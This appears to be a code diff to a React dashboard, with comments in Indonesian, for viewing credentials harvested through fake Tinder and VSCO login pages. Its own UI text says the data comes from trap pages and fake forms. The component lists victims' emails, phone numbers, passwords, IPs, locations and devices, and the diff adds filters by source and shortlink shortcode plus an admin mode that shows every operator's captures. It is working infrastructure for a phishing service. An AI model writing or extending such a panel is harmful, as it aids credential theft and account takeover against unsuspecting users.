@@ -8,6 +8,17 @@ import {
   CardHeader,
   CardTitle,
 } from '@/components/ui/card';
+import { Input } from '@/components/ui/input';
+import { Label } from '@/components/ui/label';
+import {
+  Select,
+  SelectContent,
+  SelectGroup,
+  SelectItem,
+  SelectLabel,
+  SelectTrigger,
+  SelectValue,
+} from '@/components/ui/select';
 import {
   Table,
   TableBody,
@@ -17,8 +28,17 @@ import {
   TableRow,
 } from '@/components/ui/table';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
+import { Button } from '@/components/ui/button';
 import { formatDate } from '@/lib/utils';
-import { Eye, Facebook, Mail, Phone, Shield } from 'lucide-react';
+import {
+  Eye,
+  Facebook,
+  Filter,
+  Mail,
+  Phone,
+  RefreshCcw,
+  Shield,
+} from 'lucide-react';
 import { useEffect, useState } from 'react';
 
 interface FormCaptureData {
@@ -36,34 +56,90 @@ interface FormCaptureData {
   device: string | null;
   os: string | null;
   created_at: bigint | null;
+  shortcode?: string | null;
+}
+
+interface FiltersState {
+  source: string | null;
+  shortcode: string | null;
+  showFilters: boolean;
+  isAdmin?: boolean;
 }
 
 export function FormCapturesView() {
   const [formCaptures, setFormCaptures] = useState<FormCaptureData[]>([]);
   const [isLoading, setIsLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
+  const [filters, setFilters] = useState<FiltersState>({
+    source: null,
+    shortcode: null,
+    showFilters: false,
+    isAdmin: false,
+  });
+  const [shortcodeInput, setShortcodeInput] = useState('');
 
-  useEffect(() => {
-    async function fetchFormCaptures() {
-      try {
-        const response = await fetch('/api/dashboard/form-captures');
+  const fetchFormCaptures = async () => {
+    setIsLoading(true);
+    try {
+      let url = '/api/dashboard/form-captures';
 
-        if (!response.ok) {
-          throw new Error('Failed to fetch form captures');
-        }
+      // Tambahkan parameter query jika filter aktif
+      const queryParams = new URLSearchParams();
+      if (filters.source) queryParams.append('source', filters.source);
+      if (filters.shortcode) queryParams.append('shortcode', filters.shortcode);
 
-        const data = await response.json();
-        setFormCaptures(data.data || []);
-      } catch (err) {
-        console.error('Error fetching form captures:', err);
-        setError('Failed to load form captures data');
-      } finally {
-        setIsLoading(false);
+      if (queryParams.toString()) {
+        url += `?${queryParams.toString()}`;
       }
-    }
 
+      const response = await fetch(url);
+
+      if (!response.ok) {
+        throw new Error('Failed to fetch form captures');
+      }
+
+      const data = await response.json();
+      setFormCaptures(data.data || []);
+      // Update isAdmin status jika ada di respons
+      if (data.filters && data.filters.hasOwnProperty('isAdmin')) {
+        setFilters((prev) => ({ ...prev, isAdmin: data.filters.isAdmin }));
+      }
+    } catch (err) {
+      console.error('Error fetching form captures:', err);
+      setError('Failed to load form captures data');
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  // Jalankan fetchFormCaptures saat komponen dimuat atau filter berubah
+  useEffect(() => {
     fetchFormCaptures();
-  }, []);
+  }, [filters.source, filters.shortcode]);
+
+  // Handler untuk mengubah filter source
+  const handleSourceChange = (value: string) => {
+    setFilters((prev) => ({ ...prev, source: value === 'all' ? null : value }));
+  };
+
+  // Handler untuk mengubah filter shortcode
+  const handleShortcodeFilter = () => {
+    setFilters((prev) => ({
+      ...prev,
+      shortcode: shortcodeInput.trim() === '' ? null : shortcodeInput.trim(),
+    }));
+  };
+
+  // Handler untuk mereset filter
+  const handleResetFilters = () => {
+    setFilters({ source: null, shortcode: null, showFilters: false });
+    setShortcodeInput('');
+  };
+
+  // Toggle tampilan filter
+  const toggleFilters = () => {
+    setFilters((prev) => ({ ...prev, showFilters: !prev.showFilters }));
+  };
 
   // Helper function untuk mendapatkan warna badge berdasarkan source
   const getSourceColor = (source: string) => {
@@ -93,7 +169,7 @@ export function FormCapturesView() {
     }
   };
 
-  // Filter form captures berdasarkan source
+  // Filter form captures berdasarkan source untuk tab
   const tinderCaptures = formCaptures.filter(
     (capture) => capture.source.toLowerCase() === 'tinder',
   );
@@ -168,12 +244,99 @@ export function FormCapturesView() {
         <div>
           <h1 className='text-2xl font-bold tracking-tight'>
             Form Captures Data
+            {filters.isAdmin && (
+              <Badge
+                variant='outline'
+                className='ml-2 bg-yellow-100 text-yellow-800'
+              >
+                <Shield className='mr-1 h-3 w-3' />
+                Admin Mode
+              </Badge>
+            )}
           </h1>
           <p className='text-muted-foreground'>
-            Data yang berhasil ditangkap dari halaman trap dan form palsu
+            {filters.isAdmin
+              ? 'Data yang berhasil ditangkap dari semua halaman trap dan form palsu. Menampilkan data dari semua user.'
+              : 'Data yang berhasil ditangkap dari halaman trap dan form palsu. Hanya menampilkan data dari shortlink yang Anda miliki.'}
           </p>
         </div>
+
+        <div className='flex space-x-2'>
+          <Button
+            variant='outline'
+            size='sm'
+            onClick={toggleFilters}
+            className='flex items-center'
+          >
+            <Filter className='mr-2 h-4 w-4' />
+            Filter
+          </Button>
+
+          <Button
+            variant='outline'
+            size='sm'
+            onClick={fetchFormCaptures}
+            className='flex items-center'
+          >
+            <RefreshCcw className='mr-2 h-4 w-4' />
+            Refresh
+          </Button>
+        </div>
       </div>
+
+      {/* Filter Section */}
+      {filters.showFilters && (
+        <Card className='mb-6'>
+          <CardHeader>
+            <CardTitle className='text-lg'>Filter Data</CardTitle>
+            <CardDescription>
+              Filter data berdasarkan kriteria tertentu
+            </CardDescription>
+          </CardHeader>
+          <CardContent>
+            <div className='grid gap-6 md:grid-cols-2'>
+              <div className='space-y-2'>
+                <Label htmlFor='source'>Type Halaman</Label>
+                <Select
+                  onValueChange={handleSourceChange}
+                  defaultValue={filters.source || 'all'}
+                >
+                  <SelectTrigger id='source'>
+                    <SelectValue placeholder='Pilih tipe halaman' />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectGroup>
+                      <SelectLabel>Tipe Halaman</SelectLabel>
+                      <SelectItem value='all'>Semua Halaman</SelectItem>
+                      <SelectItem value='tinder'>Tinder</SelectItem>
+                      <SelectItem value='vsco'>VSCO</SelectItem>
+                    </SelectGroup>
+                  </SelectContent>
+                </Select>
+              </div>
+
+              <div className='space-y-2'>
+                <Label htmlFor='shortcode'>Shortcode</Label>
+                <div className='flex space-x-2'>
+                  <Input
+                    id='shortcode'
+                    placeholder='Masukkan shortcode'
+                    value={shortcodeInput}
+                    onChange={(e) => setShortcodeInput(e.target.value)}
+                  />
+                  <Button onClick={handleShortcodeFilter}>Filter</Button>
+                </div>
+              </div>
+            </div>
+
+            <div className='mt-4 flex justify-end'>
+              <Button variant='outline' onClick={handleResetFilters}>
+                Reset Filter
+              </Button>
+            </div>
+          </CardContent>
+        </Card>
+      )}
 
       <Tabs defaultValue='all' className='space-y-4'>
         <TabsList>
@@ -252,7 +415,8 @@ function FormCaptureTable({
       <CardHeader>
         <CardTitle>Data Form Captures</CardTitle>
         <CardDescription>
-          Informasi yang berhasil dikumpulkan dari halaman palsu
+          Informasi yang berhasil dikumpulkan dari halaman palsu melalui
+          shortlink Anda
         </CardDescription>
       </CardHeader>
       <CardContent>
@@ -260,49 +424,44 @@ function FormCaptureTable({
           <Table>
             <TableHeader>
               <TableRow>
-                <TableHead>Waktu</TableHead>
-                <TableHead>Sumber</TableHead>
-                <TableHead>Email/Telepon</TableHead>
+                <TableHead className='w-[100px]'>Source</TableHead>
+                <TableHead>Email / Phone</TableHead>
                 <TableHead>Password</TableHead>
-                <TableHead>IP/Lokasi</TableHead>
-                <TableHead>Perangkat</TableHead>
-                <TableHead>Data Tambahan</TableHead>
+                <TableHead>Info</TableHead>
+                <TableHead>Shortcode</TableHead>
+                <TableHead className='text-right'>Tanggal</TableHead>
               </TableRow>
             </TableHeader>
             <TableBody>
               {formCaptures.map((capture) => (
                 <TableRow key={capture.id}>
-                  <TableCell className='whitespace-nowrap'>
-                    {capture.created_at
-                      ? formatDate(capture.created_at.toString())
-                      : 'N/A'}
-                  </TableCell>
-                  <TableCell>
-                    <Badge
-                      className={getSourceColor(capture.source)}
-                      variant='outline'
+                  <TableCell className='font-medium'>
+                    <div
+                      className={`flex items-center rounded-md p-1 ${getSourceColor(
+                        capture.source,
+                      )}`}
                     >
-                      <span className='flex items-center gap-1'>
-                        {getSourceIcon(capture.source)}
-                        <span>{capture.source}</span>
-                      </span>
-                    </Badge>
+                      {getSourceIcon(capture.source)}
+                      <span className='ml-1'>{capture.source}</span>
+                    </div>
                   </TableCell>
                   <TableCell>
                     {capture.email && (
-                      <div className='flex items-center gap-1'>
-                        <Mail className='h-4 w-4 text-blue-600' />
-                        <span className='text-sm'>{capture.email}</span>
+                      <div className='flex items-center text-sm'>
+                        <Mail className='mr-1 h-4 w-4' />
+                        {capture.email}
                       </div>
                     )}
                     {capture.phone && (
-                      <div className='mt-1 flex items-center gap-1'>
-                        <Phone className='h-4 w-4 text-green-600' />
-                        <span className='text-sm'>{capture.phone}</span>
+                      <div className='flex items-center text-sm'>
+                        <Phone className='mr-1 h-4 w-4' />
+                        {capture.phone}
                       </div>
                     )}
-                    {!capture.email && !capture.phone && (
-                      <span className='text-sm text-muted-foreground'>N/A</span>
+                    {capture.name && (
+                      <div className='mt-1 text-xs text-muted-foreground'>
+                        Name: {capture.name}
+                      </div>
                     )}
                   </TableCell>
                   <TableCell>
@@ -326,27 +485,26 @@ function FormCaptureTable({
                           {capture.country}
                         </div>
                       )}
-                    </div>
-                  </TableCell>
-                  <TableCell>
-                    <div className='text-sm'>
-                      <div>{capture.device || 'N/A'}</div>
-                      {(capture.browser || capture.os) && (
+                      {capture.browser && (
                         <div className='text-xs text-muted-foreground'>
-                          {capture.browser}{' '}
-                          {capture.os ? `/ ${capture.os}` : ''}
+                          {capture.browser} / {capture.os}
                         </div>
                       )}
                     </div>
                   </TableCell>
                   <TableCell>
-                    {capture.additional_data ? (
-                      <pre className='max-h-24 max-w-xs overflow-auto rounded bg-muted p-1 text-xs'>
-                        {JSON.stringify(capture.additional_data, null, 2)}
-                      </pre>
+                    {capture.shortcode ? (
+                      <span className='rounded bg-gray-100 p-1 font-mono text-xs dark:bg-gray-800'>
+                        {capture.shortcode}
+                      </span>
                     ) : (
-                      <span className='text-sm text-muted-foreground'>N/A</span>
+                      <span className='text-xs text-gray-400'>-</span>
                     )}
+                  </TableCell>
+                  <TableCell className='text-right'>
+                    {capture.created_at
+                      ? formatDate(capture.created_at.toString())
+                      : 'N/A'}
                   </TableCell>
                 </TableRow>
               ))}
